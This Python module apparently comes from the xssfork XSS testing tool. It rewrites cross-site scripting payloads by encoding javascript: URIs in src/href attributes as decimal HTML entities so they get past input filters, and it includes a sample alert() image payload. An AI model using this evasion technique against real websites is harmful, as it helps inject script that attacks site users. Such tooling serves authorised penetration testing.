#! /usr/bin/env python
# coding=utf-8
"""
Copyright (c) 2017 xssfork developers (http://xssfork.codersec.net/)
See the file 'doc/COPYING' for copying permission
"""
from __future__ import print_function
import re
import traceback
import random
try:
    from __init__ import Temper
    from __init__ import LIGHT_MODEL
    from __init__ import HEAVY_MODEL
    from __init__ import EXCEPTION_LOG_PATH
except ImportError:
    from temper import Temper
    from common.system_config import LIGHT_MODEL
    from common.system_config import HEAVY_MODEL
    from common.path import EXCEPTION_LOG_PATH


class Temper(Temper):

    def __init__(self):
        super(Temper, self).__init__()
        self.keywords = super(Temper, self).get_keywords()
        self.payload = None

    def temper(self, payload_set, model=LIGHT_MODEL, **kw):
        temp_payload_set = payload_set
        if not isinstance(payload_set, set):
            payload_set = set()
            payload_set.add(temp_payload_set)
        payloads = set()
        for payload in payload_set:
            self.payload = payload
            payloads.add(self.keyword_tenhex(payload, 1))
            payloads.add(self.keyword_tenhex(payload, 2))
        return payloads

    def keyword_tenhex(self, str, model=1):
        encode_str = ""
        result_str = ""
        try:
            link_content = re.findall('(?:src|href)=(".*?")', str, re.S)[0]
            if "javascript" in link_content:
                for char in link_content.replace("\"", ""):
                    if model == 1:
                        encode_str += "&#{};".format(ord(char))
                    elif model == 2:
                        encode_str += "&#0{}".format(ord(char))
                result_str = str.replace(link_content, encode_str)
        except IndexError:
            traceback.print_exc(file=open(EXCEPTION_LOG_PATH, 'a'))
        return result_str

if __name__ == "__main__":
    payload = '<img src="javascript:alert(65534);">'
    payloads = set()
    payloads.add(payload)
    print(Temper().temper(payload,))
